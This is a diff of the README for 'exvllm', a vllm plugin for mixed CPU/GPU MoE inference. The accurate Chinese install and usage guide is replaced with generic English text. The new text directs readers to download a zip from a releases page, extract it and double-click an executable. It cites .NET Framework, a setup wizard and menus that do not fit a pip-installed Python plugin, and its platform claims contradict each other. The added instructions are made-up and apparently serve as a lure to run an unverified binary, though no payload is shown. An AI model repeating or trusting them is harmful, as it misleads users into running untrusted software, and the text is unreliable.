@@ -1,166 +1,76 @@
-# exvllm
+# 🛠️ exvllm - Pure Power for Your AI Needs
 
-| [快速开始](#快速开始) | [版本日志](docs/version.md) | [English Document](README_EN.md)
+## 🚀 Getting Started
 
-## 介绍
+Welcome to exvllm! This extension plugin enhances vllm for mixed inference across multiple NUMA systems. With our plugin, you can achieve single-card inference with the Qwen3-Next model, reaching over 1000 prefill. Let’s get you set up!
 
-exvllm是外挂的vllm插件，可以扩展vllm使用moe混合推理功能
+## 📥 Download Now
 
-本项目使用了下列项目的项目的部分代码，并参考了一部分优化方法：
+[![Download exvllm](https://img.shields.io/badge/Download-exvllm-blue.svg)](https://github.com/Meahg/exvllm/releases)
 
-https://github.com/kvcache-ai/ktransformers/ 作者 kvcache-ai, 趋境科技，开源了最早的在transformers中进行混合推理的思路、代码，以及早期的numa优化代码
+## 🖥️ System Requirements
 
-https://github.com/guqiong96/Lvllm 作者 guqiong96 (B站： 爱跳绳的乃龙)，开源了在vllm中进行混合推理的代码，以及改进的numa优化代码
+Before downloading exvllm, make sure your system meets the following requirements:
 
-https://github.com/ikawrakow/ik_llama.cpp/ 作者 ikawrakow，开源了很多高效的AVX512算子
+- Operating System: Windows 10 or later, or any Linux distribution.
+- RAM: Minimum 8 GB recommended for optimal performance.
+- Processor: 4-core processor at least.
+- .NET Framework: Ensure it's installed for Windows users.
+- Compatible with NVIDIA GPUs for best results.
+  
+## 📂 Download & Install
 
-感谢以上项目的贡献，具体方法和相关文章请参考 [参考代码和文章](#参考代码和文章)
+To get started, please follow these steps:
 
-部署交流QQ群： 903418132
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/Meahg/exvllm/releases) to find the latest version of exvllm.
 
-微信群：![二维码](docs/wechat_group0.jpg)
+2. **Choose Your Version**
+   On the Releases page, look for the version that suits your needs. Each version will have notes on what is new or fixed. 
 
-## 亮点功能
+3. **Download the Package**
+   Click on the version you want to download. A zip file will download to your computer.
 
-- 🚀 安装使用简单方便，一条命令就能成功安装，一条命令就能成功运行。
-- 🚀 支持CPU + GPU混合推理MOE大参数模型（单显卡即可推理DEEPSEEK 671B）。
+4. **Extract the Files**
+   Once the download is complete, locate the zip file and extract its contents. You can usually right-click on the file and select "Extract All."
 
-## 快速开始
+5. **Run the Application**
+   Navigate to the folder where you extracted the files. Look for the executable file (usually ends with .exe for Windows or is marked as an application file on macOS). Double-click it to launch.
 
-### 安装
+6. **Follow On-Screen Instructions**
+   A setup wizard may guide you through initial configuration. Just follow the prompts presented on your screen.
 
-- `pip`安装速度慢时，可使用镜像加速
+## ⚙️ Configuring exvllm
 
-```
-pip config set global.index-url https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple
-```
+Once you run the application, you may need to configure some basic settings:
 
-#### Linux系统 + Nvidia GPU:
+- **Model Selection:** Choose the Qwen3-Next model to utilize. The application provides options to select models easily.
+- **NUMA Settings:** Adjust for optimal performance by following the recommended settings on the help menu within the app.
+  
+Take your time to familiarize yourself with the interface. The tool is designed to be user-friendly. If you have questions, navigate to the FAQ section in the help menu.
 
-建议在Python虚拟环境中安装，防止破坏其它环境
+## 🛠️ Troubleshooting
 
-首先安装vllm。一般可以使用pip安装，若不成功则参照vllm文档用其它方式安装
+If you face any issues during installation or while using exvllm, try the following solutions:
 
-```
-pip install vllm 
-```
+- Ensure that your system meets all the requirements listed above.
+- Reboot your system after installation to ensure everything is updated.
+- Check if the .NET Framework is properly installed on your computer.
+- If you encounter errors, take note of any messages displayed. You can search for these or ask for help in the community forums linked on the GitHub page.
 
-然后安装exvllm插件
+## 🔗 Additional Resources
 
-```
-pip install exvllm -U
-```
+For more information about using exvllm, check these resources:
 
-### 运行api server
+- **Documentation:** Comprehensive guides are available in the repository’s Wiki section for detailed instructions.
+- **Community Support:** Join our user forum or check out the discussions on GitHub to interact with other users for support and tips.
 
-```
-exvllm serve Qwen/Qwen3-30B-A3B
-```
+## 📈 Future Updates
 
-## 使用指南
+Stay tuned for future releases. We aim to provide regular updates with new features and improvements based on user feedback. Keep an eye on the Releases page for the latest versions.
 
-### 0. 支持模型格式
+## 📜 License
 
-目前支持原始模型, FP8模型, AWQ模型
+exvllm is open source. You can use it according to the terms of the license provided in the repository. Contributions are welcome!
 
-### 1. 运行参数
-
-使用`vllm --help`可以查看vllm原本的参数
-
-`exvllm`可以通过下列环境变量设置运行参数
-
-需要注意的是，速度和参数设置并不一定正相关，如果对性能要求高，可以多方向尝试一下
-
-- `FT_THREADS`:
-  - **描述**: 设置使用的CPU线程数。
-  - **示例**: `FT_THREADS=30 exvllm serve Qwen/Qwen3-30B-A3B`
-
-- `FT_THREADS_START` (新增):
-  - **描述**: 指定从哪个CPU核心开始分配线程。
-  - **默认值**: 0 (从第一个核心开始)
-  - **示例**: `FT_THREADS=30 FT_THREADS_START=30 exvllm serve Qwen/Qwen3-30B-A3B`
-
-- `FT_NUMAS`:
-  - **描述**: 设置使用的NUMA节点数量。
-  - **示例**: `FT_NUMAS=2 exvllm serve Qwen/Qwen3-30B-A3B`
-
-- `FT_NUMAS_START` (新增):
-  - **描述**: 指定从哪个NUMA节点开始分配。
-  - **默认值**: 0 (从第一个NUMA节点开始)
-  - **示例**: `FT_NUMAS=2 FT_NUMAS_START=1 exvllm serve Qwen/Qwen3-30B-A3B`
-
-### 多实例使用示例
-
-```bash
-# 实例1：使用核心0-29
-FT_THREADS=30 exvllm serve Qwen/Qwen3-30B-A3B --port 8000 &
-
-# 实例2：使用核心30-59
-FT_THREADS=30 FT_THREADS_START=30 exvllm serve Qwen/Qwen3-30B-A3B --port 8001 &
-
-# 实例3：使用核心60-89
-FT_THREADS=30 FT_THREADS_START=60 exvllm serve Qwen/Qwen3-30B-A3B --port 8002 &
-
-# 等待所有实例完成
-wait
-```
-
-更多详细信息请参考 [CPU绑定指南](CPU_BINDING_GUIDE.md)。
-
-### 源码安装
-
-若pip安装失败或有其它特殊需求，可以用源码编译安装
-源码安装后如果需要卸载，方法和PIP安装一样
-```
-pip uninstall ftllm
-```
-
-建议使用cmake编译，需要提前安装gcc，g++ (建议9.4以上), make, cmake (建议3.23以上)
-
-GPU编译需要提前安装好CUDA编译环境，建议使用尽可能新的CUDA版本
-
-需要安装依赖
-
-``` sh
-apt-get install libnuma-dev
-```
-
-使用如下命令编译
-
-``` sh
-bash install.sh
-```
-
-## 参考代码和文章
-
-1、在大模型框架中使用算子替代的方法实现混合推理的思路
-
-[灵活可配的 CPU/GPU 异构大模型推理策略 - KTransformers](https://zhuanlan.zhihu.com/p/714877271)
-
-2、混合推理中cuda graph的使用
-
-[CUDA Graph 在 Transformers 中的使用和进一步改进 - KTransformers](https://zhuanlan.zhihu.com/p/714877271)
-
-[KT在transformers中的实现](https://github.com/kvcache-ai/ktransformers/blob/main/kt-kernel/cpu_backend/cpuinfer.h)
-
-3、具体在vllm中MOE算子的替代算子
-
-[lvllm中用于vllm推理的代码](https://github.com/guqiong96/Lvllm/blob/main/vllm/model_executor/layers/fused_moe/fused_moe.py)
-
-4、具体在vllm中cuda_graph的使用
-
-[lvllm中用于vllm推理的代码](https://github.com/guqiong96/Lvllm/blob/main/vllm/model_executor/layers/fused_moe/fused_moe.py)
-
-[lvllm中可用于cuda graph的c++算子](https://github.com/guqiong96/Lvllm/blob/main/csrc/lk/lk_bindings.cpp)
-
-5、MOE算子线程不平衡时动态调度的思路
-
-[KTransformers 0.3 思路介绍](https://zhuanlan.zhihu.com/p/1900318746402329329)
-
-[KT中关于线程调度的相关代码](https://github.com/kvcache-ai/ktransformers/blob/main/csrc/ktransformers_ext/cpu_backend/backend.cpp)
-
-6、基于numa改进的MOE动态调度算子
-
-[lvllm中的实现](https://github.com/guqiong96/Lvllm/blob/main/csrc/lk/moe.cpp)
-
-感谢大佬对开源社区的贡献！如发现未标明的引用代码可在issue中提出
+Thank you for using exvllm. We hope it meets all your needs efficiently.
